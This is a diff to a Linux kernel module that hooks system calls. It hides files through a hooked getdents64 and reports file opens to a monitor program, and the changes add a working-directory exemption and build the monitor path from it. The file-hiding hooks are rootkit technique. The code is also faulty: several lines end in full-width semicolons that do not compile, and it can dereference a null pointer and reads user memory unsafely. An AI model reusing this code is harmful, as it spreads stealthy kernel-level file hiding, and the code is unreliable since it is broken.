@@ -37,6 +37,7 @@ char *INEXISTFILE = "HIDEAFILEINKERNEL";
 char *INEXISTMONITOR = "SETMONITORPROGRAM";
 char *hidfiles[256];
 char *monitor = NULL;
+char *workdir = NULL;
 int filenum;
 int moni_open;
 int moni_unlink;
@@ -147,7 +148,7 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 }
 
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
-    if(moni_open){
+    if(moni_open && strncmp(filename, workdir, strlen(workdir)) != 0){
         callMonitor("open", filename);
     }
            
@@ -241,8 +242,11 @@ static int configMonitor(char *msg){
     
     if(strncmp(msg, "set", 3) == 0){
         msg += 4;
-        monitor = (char*) vmalloc(strlen(msg) + 1);
+        workdir = (char*) vmalloc(strlen(msg) + 1);
+        memcpy(workdir, msg, strlen(msg) + 1)；
+        monitor = (char*) vmalloc(strlen(msg) + 20);
         memcpy(monitor, msg, strlen(msg) + 1)；
+        strcat(monitor, "/./monitor")；
     } else if(strncmp(msg, "open", 4) == 0){
         moni_open = 1;
     } else if(strncmp(msg, "unlink", 6) == 0){
